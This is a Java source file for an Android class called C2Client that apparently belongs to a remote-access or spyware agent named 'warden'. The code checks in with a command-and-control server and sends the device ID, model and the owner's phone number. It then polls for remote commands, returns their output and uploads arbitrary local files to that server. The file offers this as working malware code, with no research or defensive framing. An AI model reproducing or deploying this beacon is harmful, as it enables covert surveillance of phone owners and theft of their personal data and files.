package com.warden.agent;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

/** HTTP(S) JSON beacon. */
public class C2Client {

    public static class Command {
        public String id, cmd, args;
    }

    private final Context ctx;
    private final Prefs prefs;

    public C2Client(Context ctx, Prefs prefs) {
        this.ctx = ctx;
        this.prefs = prefs;
    }

    private String base() { return prefs.c2(); }

    private String deviceId() {
        try {
            String s = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            return s != null ? s : "unknown";
        } catch (Exception e) { return "unknown"; }
    }

    /** Register/refresh. Returns agent id. */
    public String checkin() throws Exception {
        JSONObject j = new JSONObject();
        j.put("device_id", deviceId());
        j.put("model", Build.MODEL);
        j.put("brand", Build.BRAND);
        j.put("android", Build.VERSION.RELEASE);
        j.put("sdk", Build.VERSION.SDK_INT);
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) j.put("phone", tm.getLine1Number());
        } catch (Exception ignored) {}
        String resp = post("/api/checkin", j.toString());
        JSONObject r = new JSONObject(resp);
        if (r.has("interval")) prefs.interval(r.getInt("interval"));
        return r.getString("agent_id");
    }

    public List<Command> pollCommands() throws Exception {
        String resp = get("/api/commands/" + URLEncoder.encode(prefs.agentId(), "UTF-8"));
        List<Command> out = new ArrayList<>();
        JSONArray arr = new JSONArray(resp);
        for (int i = 0; i < arr.length(); i++) {
            JSONObject c = arr.getJSONObject(i);
            Command cmd = new Command();
            cmd.id = c.getString("id");
            cmd.cmd = c.getString("cmd");
            cmd.args = c.optString("args", "");
            out.add(cmd);
        }
        return out;
    }

    public void sendResult(String cmdId, String output) throws Exception {
        JSONObject j = new JSONObject();
        j.put("agent_id", prefs.agentId());
        j.put("cmd_id", cmdId);
        j.put("output", output);
        post("/api/result", j.toString());
    }

    public void uploadFile(String localPath) throws Exception {
        File f = new File(localPath);
        if (!f.exists()) throw new Exception("no file: " + localPath);
        String boundary = "----warden" + System.currentTimeMillis();
        URL url = new URL(base() + "/api/upload?agent_id="
                + URLEncoder.encode(prefs.agentId(), "UTF-8")
                + "&name=" + URLEncoder.encode(f.getName(), "UTF-8"));
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        DataOutputStream dos = new DataOutputStream(c.getOutputStream());
        dos.writeBytes("--" + boundary + "\r\n");
        dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + f.getName() + "\"\r\n");
        dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
        FileInputStream fis = new FileInputStream(f);
        byte[] buf = new byte[8192];
        int n;
        while ((n = fis.read(buf)) != -1) dos.write(buf, 0, n);
        fis.close();
        dos.writeBytes("\r\n--" + boundary + "--\r\n");
        dos.flush();
        dos.close();
        c.getResponseCode();
        c.disconnect();
    }

    private String get(String path) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(base() + path).openConnection();
        c.setRequestMethod("GET");
        c.setConnectTimeout(15000);
        c.setReadTimeout(15000);
        return read(c);
    }

    private String post(String path, String body) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(base() + path).openConnection();
        c.setRequestMethod("POST");
        c.setConnectTimeout(15000);
        c.setReadTimeout(15000);
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "application/json");
        OutputStream os = c.getOutputStream();
        os.write(body.getBytes("UTF-8"));
        os.close();
        return read(c);
    }

    private String read(HttpURLConnection c) throws Exception {
        InputStream is = c.getResponseCode() >= 400 ? c.getErrorStream() : c.getInputStream();
        if (is == null) throw new Exception("http " + c.getResponseCode());
        BufferedReader r = new BufferedReader(new InputStreamReader(is, "UTF-8"));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = r.readLine()) != null) sb.append(line);
        r.close();
        c.disconnect();
        return sb.toString();
    }
}
